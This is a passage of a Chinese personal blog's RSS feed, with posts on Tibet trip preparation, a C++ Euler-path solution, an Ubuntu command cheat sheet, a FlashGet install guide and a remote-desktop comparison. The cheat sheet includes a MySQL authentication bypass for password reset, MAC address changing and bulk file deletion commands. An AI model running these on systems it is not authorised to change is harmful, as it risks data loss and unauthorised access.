>拉萨，纳木措，羊八井，大竹卡，日喀则、江孜、羊卓雍措、拉萨</font></div><div><br></div><div>第三个准备的是装备，一个帽子，一个眼镜，最后一周网购之；围巾？进藏后如果有需要在当地买。</div><div>&nbsp; &nbsp; 相机，手机，充电器，剃须刀，防晒霜；保暖内衣防万一，外套和短袖，简装上阵。</div><div>&nbsp; &nbsp; 由衷感谢为此赞助意见的人。</div><div><br></div><div>第四个准备的是状态，身体很重要，怕高反，不是怕因为高反玩不了，而是丢不起这个人，先跑了两周步，最后一周停止，因为专家说xxx。</div><div>&nbsp; &nbsp; 要玩好，先工作好，工作很重要，要把玩儿的一周的工作提前一周基本消灭掉。</div><div>&nbsp; &nbsp; 这个时间，突然想写点什么，不只是为了向以后想去的人分享点什么，也是为了一个愿望的实现而感到欣慰，虽然没什么难度，但是看到一个愿望成为现实，成就感依然令人振奋。</div><div>&nbsp; &nbsp; 我思故我在，我行故我乐。</div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720123281233309/</guid>
    </item>
    <item>
      <title>
<![CDATA[欧拉回路POJ2337]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010111485227807/</link>
      <description>
<![CDATA[#include&lt;iostream&gt;<br>#include&lt;cstdio&gt;<br>#include&lt;cstring&gt;<br>#include&lt;algorithm&gt;<br>using namespace std;<br>struct edge{int to, next,/*next e of the same v*/ id; bool visited;} e[1024];<br>int v[26], eNum, cd[26], rd[26], visited[26], path[26][26], ans[1024], ansI;<br>void insert(int from, int to, int id) {<br>&nbsp;&nbsp;&nbsp; e[eNum].to = to, e[eNum].next = v[from];<br>&nbsp;&nbsp;&nbsp; e[eNum].visited = 0;e[eNum].id = id;<br>&nbsp;&nbsp; &nbsp;v[from] = eNum++;<br>}<br>char dict[1024][26];<br>int cmp(const void *pa, const void *pb){<br>&nbsp;&nbsp;&nbsp; const char* a = (const char*)pa;<br>&nbsp;&nbsp;&nbsp; const char* b = (const char*)pb;<br>&nbsp;&nbsp;&nbsp; return -strcmp(a,b);<br>}<br>void dfs(int id) {<br>&nbsp;&nbsp;&nbsp; visited[id] = true;<br>&nbsp;&nbsp;&nbsp; for(int i = 0; i &lt; 26; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!visited[i] &amp;&amp; path[id][i])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dfs(i);<br>}<br>int judge() {<br>&nbsp;&nbsp;&nbsp; int num = 0, id = -1;<br>&nbsp;&nbsp; &nbsp;//is there illegal vertex<br>&nbsp;&nbsp;&nbsp; for(int i = 0; i &lt; 26; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (cd[i] - rd[i] == 1) {id = i; num++;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (rd[i] - cd[i] == 1) num++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (rd[i] - cd[i] &gt; 1 || rd[i] - cd[i] &lt; -1) return -1;<br>&nbsp;&nbsp;&nbsp; if (num &gt; 2) return -1;<br>&nbsp;&nbsp; &nbsp;//if all even<br>&nbsp;&nbsp;&nbsp; if (id == -1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i = 0; i &lt; 26; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (cd[i] &gt; 0){id = i; break;}<br>&nbsp;&nbsp;&nbsp; memset(visited, 0, sizeof(visited));<br>&nbsp;&nbsp;&nbsp; dfs(id);<br>&nbsp;&nbsp; &nbsp;//*is there seperate part?<br>&nbsp;&nbsp;&nbsp; for(int i = 0; i &lt; 26; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ((cd[i] != 0 || rd[i] != 0) &amp;&amp; !visited[i]) return -1;<br>&nbsp;&nbsp;&nbsp; return id;<br>}<br>void euer(int vid, int eid) {<br>&nbsp;&nbsp;&nbsp; for(int i = v[vid]; i != -1; i = e[i].next)//foreach cd of vid.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!e[i].visited) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e[i].visited = 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; euer(e[i].to, i);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if(eid &gt;= 0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ans[ansI++] = e[eid].id;<br>}<br>int main() {<br>//&nbsp;&nbsp;&nbsp; freopen("euer.in","r",stdin);<br>&nbsp;&nbsp; &nbsp;int t,n;<br>&nbsp;&nbsp;&nbsp; cin&gt;&gt;t;<br>&nbsp;&nbsp;&nbsp; while(t--) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cin&gt;&gt;n;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i = 0; i &lt; n; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cin&gt;&gt;dict[i];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; qsort(&amp;dict[0][0], n, 26*sizeof(char), cmp);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset(visited, 0, sizeof(visited));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset(cd, 0, sizeof(cd));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset(rd, 0, sizeof(rd));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset(path, 0, sizeof(path));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eNum = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset(v, -1, sizeof(v));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i = 0; i &lt; n; i++) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int from = dict[i][0] - 'a';<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int to = dict[i][strlen(dict[i]) - 1] - 'a';<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cd[from]++; rd[to]++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; path[from][to] = 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; insert(from, to, i);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int id = judge();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (id == -1) cout&lt;&lt;"***\n";<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ansI = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; euer(id, -1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int i = n-1; i &gt;= 0; i--) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (i!=n-1) cout&lt;&lt;".";<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cout&lt;&lt;dict[ans[i]];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cout&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Math</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010111485227807/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu常用命令]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007874519183/</link>
      <description>
<![CDATA[<P><BR>查看软件xxx安装内容 </P>  <P>dpkg -L xxx 查找软件 </P>  <P>apt-cache search 正则表达式查找文件属于哪个包 </P>  <P>dpkg -S filename<BR>apt-file search filename查询软件xxx依赖哪些包 </P>  <P>apt-cache depends xxx查询软件xxx被哪些包依赖 </P>  <P>apt-cache rdepends xxx增加一个光盘源 </P>  <P>sudo apt-cdrom add系统升级 </P>  <P>sudo apt-get update<BR>sudo apt-get upgrade<BR>sudo apt-get dist-upgrade清除所以删除包的残馀配置文件 </P>  <P>dpkg -l |grep ^rc|awk '{print $2}' |tr [[\n]] [[ ]]|sudo xargs dpkg -P&nbsp; -编译时缺少h文件的自动处理 </P>  <P>sudo auto-apt run ./configure查看安装软件时下载包的临时存放目录 </P>  <P>ls /var/cache/apt/archives备份当前系统安装的所有包的列表 </P>  <P>dpkg --get-selections | grep -v deinstall &gt; ~/somefile<BR>从上面备份的安装包的列表文件恢复所有包 </P>  <P>dpkg --set-selections &lt; ~/somefile<BR>sudo dselect<BR>清理旧版本的软件缓存 </P>  <P>sudo apt-get autoclean清理所有软件缓存 </P>  <P>sudo apt-get clean删除系统不再使用的孤立软件 </P>  <P>sudo apt-get autoremove查看包在服务器上面的地址 </P>  <P>apt-get -qq --print-uris install ssh | cut -d\' -f2系统 <BR>查看内核 </P>  <P>uname -a查看Ubuntu版本 </P>  <P>cat /etc/issue查看内核加载的模块 </P>  <P>lsmod查看PCI设备 </P>  <P>lspci查看USB设备 </P>  <P>lsusb查看网卡状态 </P>  <P>sudo ethtool eth0查看CPU信息 </P>  <P>cat /proc/cpuinfo显示当前硬件信息 </P>  <P>lshw硬盘 <BR>查看硬盘的分区 </P>  <P>sudo fdisk -l查看IDE硬盘信息 </P>  <P>sudo hdparm -i /dev/hda查看SATA硬盘信息 </P>  <P>sudo hdparm -I /dev/sda<BR>或<BR>sudo apt-get install blktool<BR>sudo blktool /dev/sda id查看硬盘剩馀空间 </P>  <P>df -h<BR>df -H查看目录占用空间 </P>  <P>du -hs 目录名优盘没法卸载 </P>  <P>sync<BR>fuser -km /media/usbdisk 内存 <BR>查看当前的内存使用情况 </P>  <P>free -m进程 <BR>查看当前有哪些进程 </P>  <P>ps -A中止一个进程 </P>  <P>kill 进程号(就是ps -A中的第一列的数字)<BR>或者&nbsp; killall 进程名强制中止一个进程(在上面进程中止不成功的时候使用) </P>  <P>kill -9 进程号<BR>或者&nbsp; killall -9 进程名图形方式中止一个程序 </P>  <P>xkill 出现骷髅标志的鼠标，点击需要中止的程序即可查看当前进程的实时状况 </P>  <P>top查看进程打开的文件 </P>  <P>lsof -pADSL <BR>配置 ADSL </P>  <P>sudo pppoeconf防止 ADSL 掉线 </P>  <P>在终端内 </P>  <P>sudo&nbsp; gedit /etc/network/interfaces复制下面内容完全复盖即可 </P>  <P># /etc/network/interfaces<BR># This file describes the network interfaces available on your system<BR># and how to activate them. For more information, see interfaces(5).</P>  <P># The loopback network interface<BR>auto lo<BR>iface lo inet loopback</P>  <P># This is a list of hotpluggable network interfaces.<BR># They will be activated automatically by the hotplug subsystem.<BR>mapping hotplug<BR>script grep<BR>map eth1</P>  <P># The primary network interface<BR>iface eth1 inet static<BR>address 10.0.0.139<BR>netmask 255.255.255.0<BR>network 10.0.0.0<BR>broadcast 10.0.0.255<BR># dns-* options are implemented by the resolvconf package, if installed<BR>dns-nameservers 211.162.32.1 211.162.32.20dns-nameservers 是你的dns服务器地址，如果有路由器的同志可以打开路由器设置看看，把路由器上的默认dns服务器贴上。 </P>  <P>ADSL手工拨号 </P>  <P>sudo pon dsl-provider激活 ADSL </P>  <P>sudo /etc/ppp/pppoe_on_boot断开 ADSL </P>  <P>sudo poff查看拨号日志 </P>  <P>sudo plog如何设置动态域名 <BR>#首先去 <A rel="nofollow" href="http://www.3322.org"  >http://www.3322.org</A> 申请一个动态域名<BR>#然後修改 /etc/ppp/ip-up 增加拨号时更新域名指令<BR>sudo vim /etc/ppp/ip-up<BR>#在最後增加如下行<BR>w3m -no-cookie -dump 'http://username:password@members.3322.org/dyndns/update?system=dyndns&amp;hostname=yourdns.3322.org'<BR>网络 <BR>根据IP查网卡地址 </P>  <P>arping IP地址查看当前IP地址 </P>  <P>ifconfig eth0 |awk '/inet/ {split($2,x,":");print x[2]}'查看当前外网的IP地址 </P>  <P>w3m -no-cookie -dump <A rel="nofollow" href="http://www.ip138.com|grep"  >www.ip138.com|grep</A> -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'<BR>w3m -no-cookie -dump <A rel="nofollow" href="http://www.123cha.com|grep"  >www.123cha.com|grep</A> -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'<BR>w3m -no-cookie -dump ip.loveroot.com|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'查看当前监听80端口的程序 </P>  <P>lsof -i :80查看当前网卡的物理地址 </P>  <P>arp -a | awk '{print $4}'<BR>ifconfig eth0 | head -1 | awk '{print $5}'立即让网络支持nat </P>  <P>echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward<BR>sudo iptables -t nat -I POSTROUTING -j MASQUERADE查看路由信息 </P>  <P>netstat -rn<BR>sudo route -n<BR>手工增加删除一条路由 </P>  <P>sudo route add -net 192.168.0.0 netmask 255.255.255.0 gw 172.16.0.1<BR>sudo route del -net 192.168.0.0 netmask 255.255.255.0 gw 172.16.0.1修改网卡MAC地址的方法 </P>  <P>sudo ifconfig eth0 down #关闭网卡<BR>sudo ifconfig eth0 hw ether 00:AA:BB:CC:DD:EE #然後改地址<BR>sudo ifconfig eth0 up #然後启动网卡统计当前IP连接的个数 <BR>netstat -na|grep ESTABLISHED|awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -r -n<BR>netstat -na|grep SYN|awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -r -n统计当前20000个IP包中大于100个IP包的IP地址 <BR>tcpdump -tnn -c 20000 -i eth0 | awk -F "." '{print $1"."$2"."$3"."$4}' | sort | uniq -c | sort -nr | awk ' $1 &gt; 100 '屏蔽IPV6 <BR>echo "blacklist ipv6" | sudo tee /etc/modprobe.d/blacklist-ipv6服务 <BR>添加一个服务 </P>  <P>sudo update-rc.d 服务名 defaults 99删除一个服务 </P>  <P>sudo update-rc.d 服务名 remove临时重启一个服务 </P>  <P>/etc/init.d/服务名 restart临时关闭一个服务 </P>  <P>/etc/init.d/服务名 stop临时启动一个服务 </P>  <P>/etc/init.d/服务名 start设置 <BR>配置默认Java使用哪个 </P>  <P>sudo update-alternatives --config java修改用户资料 </P>  <P>sudo chfn userid给apt设置代理 </P>  <P>export http_proxy=http://xx.xx.xx.xx:xxx修改系统登录信息 </P>  <P>sudo vim /etc/motd中文 <BR>转换文件名由GBK为UTF8 </P>  <P>sudo apt-get install convmv<BR>convmv -r -f cp936 -t utf8 --notest --nosmart *批量转换src目录下的所有文件内容由GBK到UTF8 <BR>find src -type d -exec mkdir -p utf8/{} \;<BR>find src -type f -exec iconv -f GBK -t UTF-8 {} -o utf8/{} \;<BR>mv utf8/* src<BR>rm -fr utf8转换文件内容由GBK到UTF8 </P>  <P>iconv -f gbk -t utf8 $i &gt; newfile 转换 mp3 标签编码 </P>  <P>sudo apt-get install python-mutagen<BR>find . -iname “*.mp3” -execdir mid3iconv -e GBK {} \;控制台下显示中文 </P>  <P>sudo apt-get install zhcon<BR>使用时，输入zhcon即可文件 <BR>快速查找某个文件 </P>  <P>whereis filename<BR>find 目录 -name 文件名查看文件类型 </P>  <P>file filename显示xxx文件倒数6行的内容 </P>  <P>tail -n 6 xxx让tail不停地读地最新的内容 </P>  <P>tail -n 10 -f /var/log/apache2/access.log查看文件中间的第五行（含）到第10行（含）的内容 </P>  <P>sed -n '5,10p' /var/log/apache2/access.log查找包含xxx字符串的文件 </P>  <P>grep -l -r xxx .查找关于xxx的命令 </P>  <P>apropos xxx<BR>man -k xxx通过ssh传输文件 </P>  <P>scp -rp /path/filename <A rel="nofollow" href="mailto:username@remoteIP:/path"  >username@remoteIP:/path</A>&nbsp; #将本地文件拷贝到服务器上<BR>scp -rp <A rel="nofollow" href="mailto:username@remoteIP:/path/filename"  >username@remoteIP:/path/filename</A> /path&nbsp; #将远程文件从服务器下载到本地查看某个文件被哪些应用程序读写 </P>  <P>lsof 文件名把所有文件的後辍由rm改为rmvb </P>  <P>rename 's/.rm$/.rmvb/' *把所有文件名中的大写改为小写 </P>  <P>rename 'tr/A-Z/a-z/' *删除特殊文件名的文件，如文件名：--help.txt <BR>rm -- --help.txt 或者 rm ./--help.txt查看当前目录的子目录 <BR>ls -d */. 或 echo */.将当前目录下最近30天访问过的文件移动到上级back目录 <BR>find . -type f -atime -30 -exec mv {} ../back \;将当前目录下最近2小时到8小时之内的文件显示出来 <BR>find . -mmin +120 -mmin -480 -exec more {} \;删除修改时间在30天之前的所有文件 <BR>find . -type f -mtime +30 -mtime -3600 -exec rm {} \;查找guest用户的以avi或者rm结尾的文件并删除掉 <BR>find . -name '*.avi' -o -name '*.rm' -user 'guest' -exec rm {} \;查找的不以java和xml结尾,并7天没有使用的文件删除掉 <BR>find . ! -name *.java ! -name ‘*.xml’ -atime +7 -exec rm {} \;统计当前文件个数 <BR>ls /usr/bin|wc -w统计当前目录个数 <BR>ls -l /usr/bin|grep ^d|wc -l显示当前目录下2006-01-01的文件名 <BR>ls -l |grep 2006-01-01 |awk '{print $8}'</P>  <P><BR>压缩 <BR>解压缩 xxx.tar.gz </P>  <P>tar -zxvf xxx.tar.gz解压缩 xxx.tar.bz2 </P>  <P>tar -jxvf xxx.tar.bz2压缩aaa bbb目录为xxx.tar.gz </P>  <P>tar -zcvf xxx.tar.gz aaa bbb压缩aaa bbb目录为xxx.tar.bz2 </P>  <P>tar -jcvf xxx.tar.bz2 aaa bbbNautilus <BR>显示隐藏文件 </P>  <P>Ctrl+h显示地址栏 </P>  <P>Ctrl+l特殊 URI 地址 </P>  <P>* computer:/// - 全部挂载的设备和网络<BR>* network:/// - 浏览可用的网络<BR>* burn:/// - 一个刻录 CDs/DVDs 的数据虚拟目录<BR>* smb:/// - 可用的 windows/samba 网络资源<BR>* x-nautilus-desktop:/// - 桌面项目和图标<BR>* <A rel="nofollow" href="file:///"  >file:///</A> - 本地文件<BR>* trash:/// - 本地回收站目录<BR>* ftp:// - FTP 文件夹<BR>* ssh:// - SSH 文件夹<BR>* fonts:/// - 字体文件夹，可将字体文件拖到此处以完成安装<BR>* themes:/// - 系统主题文件夹<BR>查看已安装字体 </P>  <P>在nautilus的地址栏里输入”fonts:///“，就可以查看本机所有的fonts程序 <BR>详细显示程序的运行信息 </P>  <P>strace -f -F -o outfile &lt;cmd&gt;日期和时间 <BR>设置日期 </P>  <P>#date -s mm/dd/yy设置时间 </P>  <P>#date -s HH:MM将时间写入CMOS </P>  <P>hwclock --systohc读取CMOS时间 </P>  <P>hwclock --hctosys从服务器上同步时间 </P>  <P>sudo ntpdate time.nist.gov<BR>sudo ntpdate time.windows.com<BR>或者： </P>  <P>sudo ntpdate-debian <BR>控制台 <BR>不同控制台间切换 </P>  <P>Ctrl + ALT + ←<BR>Ctrl + ALT + →指定控制台切换 </P>  <P>Ctrl + ALT + Fn(n:1~7)控制台下滚屏 </P>  <P>SHIFT + pageUp/pageDown控制台抓图 </P>  <P>setterm -dump n(n:1~7)数据库 <BR>mysql的数据库存放在地方 </P>  <P>/var/lib/mysql从mysql中导出和导入数据 </P>  <P>mysqldump 数据库名 &gt; 文件名&nbsp; #导出数据库<BR>mysqladmin create 数据库名 #建立数据库<BR>mysql 数据库名 &lt; 文件名 #导入数据库忘了mysql的root口令怎么办 </P>  <P>sudo /etc/init.d/mysql stop<BR>sudo mysqld_safe --skip-grant-tables &amp;<BR>sudo mysqladmin -u user password 'newpassword''<BR>sudo mysqladmin flush-privileges修改mysql的root口令 </P>  <P>sudo mysqladmin -uroot -p password '你的新密码'其它 <BR>下载网站文档 </P>  <P>wget -r -p -np -k <A rel="nofollow" href="http://www.21cn.com"  >http://www.21cn.com</A><BR>· -r：在本机建立服务器端目录结构；<BR>· -p: 下载显示HTML文件的所有图片；<BR>· -np：只下载目标站点指定目录及其子目录的内容；<BR>· -k: 转换非相对链接为相对链接。如何删除Totem电影播放机的播放历史记录 </P>  <P>rm ~/.recently-used如何更换gnome程序的快捷键 </P>  <P>点击菜单，鼠标停留在某条菜单上，键盘输入任意你所需要的键，可以是组合键，会立即生效；<BR>如果要清除该快捷键，请使用backspacevim 如何显示彩色字符 <BR>sudo cp /usr/share/vim/vimcurrent/vimrc_example.vim&nbsp; /usr/share/vim/vimrc<BR>如何在命令行删除在会话设置的启动程序 <BR>cd ~/.config/autostart<BR>rm 需要删除启动程序<BR>如何提高wine的反应速度 <BR>sudo sed -ie '/GBK/,/^}/d' /usr/share/X11/locale/zh_CN.UTF-8/XLC_LOCALE<BR></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007874519183/</guid>
    </item>
    <item>
      <title>
<![CDATA[64位Ubuntu安装flashget]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201161031946443/</link>
      <description>
<![CDATA[首先, deb安装包不行，因为版本号格式不对，需要用二进制的<br><a target="_blank" rel="nofollow" href="http://bbs.flashget.com/download/flashget-1.0.3-0_en.tar.gz"  >wget http://bbs.flashget.com/download/flashget-1.0.3-0_en.tar.gz</a><br>tar xf flashget-1.0.3-0_en.tar.gz<br>cd flashget-1.0.3-0<br>sudo sh install.sh<br><br>然后需要创建一个软链接<br>sudo ln -s /lib32/libexpat.so.1.5.2 /usr/lib/libexpat.so.0<br><br>最后修改flashget的启动脚本<br>sudo vi /usr/bin/flashget<br>把最前面的-e去掉 <br><br>出错信息：<br>1. deb版本号错误<br>dpkg: error processing flashget-1.0.3-0_en.noarch.deb (--install):<br>&nbsp;parsing file '/var/lib/dpkg/tmp.ci/control' near line 7 package 'flashget':<br>&nbsp;error in Version string 'v1.0.3-beta1': version number does not start with digit<br>Errors were encountered while processing:<br>&nbsp;flashget-1.0.3-0_en.noarch.deb<br>解决办法：使用二进制包安装<br><br>2. 找不到libexpact<br>flashget: error while loading shared libraries: libexpat.so.0: cannot open shared object file: No such file or directory<br>解决办法：创建软连接<br>sudo ln -s /lib32/libexpat.so.1.5.2 /usr/lib/libexpat.so.0<br><br>3. 64位和32位的冲突&nbsp;&nbsp; <br>wrong ELF class: ELFCLASS64<br>解决办法：<br>sudo apt-get install ia32-libs<br>sudo ln -s /lib32/libexpat.so.1.5.2 /usr/lib/libexpat.so.0]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>OS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201161031946443/</guid>
    </item>
    <item>
      <title>
<![CDATA[幸福的人要有楼子的觉悟]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720120123506929/</link>
      <description>
<![CDATA[<div id="blogContent"  >  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 话说有个和尚, 苦苦寻找那传说中的大道, 有一天路过一家酒楼, 听到有人在唱曲儿, "你若无情我便休", 仰天大笑三声, 得道了, 号称楼子和尚. "你若无情我便休", 这就是楼子和尚的道.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如今休去便休去, 若觅了时无了时. 当断不断, 反受其乱.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 有一种美德, 叫做坚持; 有一种智慧, 叫做放下.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 塞翁失马, 焉知非福, 得失之间, 又哪里说得清楚?</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 你勇敢地迈出九十九步, 等到的也许不是对方的前进或踟蹰, 反而是后退. 坚持还是放下, 小聪明还是大糊涂.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span>往前一步是幸福, 退后一步是孤独.</span> 退一步也许海阔天空,&nbsp;前一步也许万劫不复.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 贪嗔痴慢疑, 这一篇字, 犯尽了五毒, 却没有个所以然.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 坚持是对的, 只要没有确认不会有结果; 放下是对的, 只要确认不是因为怕失败.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 何以确认? 问天天不应, 问地地不灵, 万物的灵长, 发明了占卜. 不是因为相信, 而是因为无奈.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 坚持是简单的, 只要将匀速直线进行到底, 需要的只是一点点的毅力.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 放下是困难的, 放下的人要想幸福, 就要领悟楼子的道, 有楼子的觉悟.</p> </div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720120123506929/</guid>
    </item>
    <item>
      <title>
<![CDATA[远程桌面与远程控制]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009310105246563/</link>
      <description>
<![CDATA[远程桌面与远程控制的方式有几种:<br>1. Windows自带的远程桌面功能: 开始-&gt;运行-&gt;mstsc<br>2. Windows自带的远程协助功能: 开始-&gt;程序-&gt;远程协助<br>3. Windows自带的NetMeeting: 开始-&gt;运行-&gt;conf<br>4. TM的远程协助<br><br>首先, 远程桌面只能在控制端显示桌面, Pass<br>Windows自带的远程协助需要两个MSN账号, 但好像走的中间服务器, 速度很慢, 而且关闭远程桌面时自动断开连接Pass<br>Netmeeting 不太适合<br>最后只能使用TM的远程协助功能, 可惜我的绿色版TM的远程协助功能不能用, 只好新安装TM2008, 一切搞定截个图:<br><a href="http://img.bimg.126.net/photo/cc52qEIrchji78bybdUp1g==/2582251436344979018.jpg" target="_blank"><img title="远程桌面与远程控制 - hankjin - 乱-Blog" alt="远程桌面与远程控制 - hankjin - 乱-Blog" style="width: 650px; height: 364px;" src="http://img.bimg.126.net/photo/cc52qEIrchji78bybdUp1g==/2582251436344979018.jpg"></a><a href="http://img.bimg.126.net/photo/uHi2ZrASTJrSEvNh7tZ-ZQ==/2582251436344979019.jpg" target="_blank"><img title="远程桌面与远程控制 - hankjin - 乱-Blog" alt="远程桌面与远程控制 - hankjin - 乱-Blog" style="width: 650px; height: 365px;" src="http://img.bimg.126.net/photo/uHi2ZrASTJrSEvNh7tZ-ZQ==/2582251436344979019.jpg"></a>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009310105246563/</guid>
    </item>
    <item>
      <title>
<![CDATA[REBOL]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720084411190347/</link>
      <description>
